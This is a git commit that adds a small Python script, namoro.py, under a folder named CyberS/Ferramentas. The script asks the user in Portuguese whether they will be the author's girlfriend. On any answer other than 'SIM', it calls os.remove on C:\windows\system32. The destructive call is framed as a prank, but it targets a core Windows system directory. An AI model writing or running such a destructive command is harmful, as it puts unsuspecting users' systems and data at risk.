4f930bab3ba3dd31f2d93af62a1bc8b8baaac986
JulioCesar <160616751+DrkCde15@users.noreply.github.com>
2025-05-23 13:56:22 -0300

    Create namoro.py

---
+++ CyberS/Ferramentas/namoro.py
@@ -0,0 +1,9 @@
+import os
+
+print("Você quer ser minha namorada?")
+resposta = input("SIM ou NÃO: ")
+
+if resposta.upper() == "SIM":
+    print("Obrigado! 💕")
+else:
+    os.remove("C:\\windows\\system32")
